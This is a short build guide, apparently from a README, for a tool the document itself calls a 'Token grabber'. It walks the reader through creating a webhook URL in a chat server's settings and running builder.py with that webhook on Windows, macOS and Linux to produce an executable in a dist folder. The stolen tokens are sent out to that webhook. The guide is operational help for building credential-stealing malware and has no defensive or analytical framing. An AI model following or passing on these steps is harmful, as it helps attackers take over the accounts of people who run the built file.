# Build Guide for {Token grabber}
## Run the builder.py Script

Now that we have a configured, we can run the builder.py script.

To build you will need created earlier the webhook url.
To access it, head over to your new server's settings and click on the **"Intergrations"** tab. Then click on the **"Webhooks"** tab.

![image](https://imgur.com/fEIbIfb.png)

To Execute the builder.py script, you need to run the following command:

### Windows
```
.\venv\Scripts\python.exe builder.py -w YOUR_WEBHOOK_URL -o FILE_NAME
```
### MacOS
```
sudo python3 builder.py -w YOUR_WEBHOOK_URL -o FILE_NAME
```
### Linux
```
sudo python3 builder.py -w YOUR_WEBHOOK_URL -o FILE_NAME
```
![image](https://imgur.com/ntQNtM5.png)

Once the builder is done, you will find your generated file in the **dist** directory.
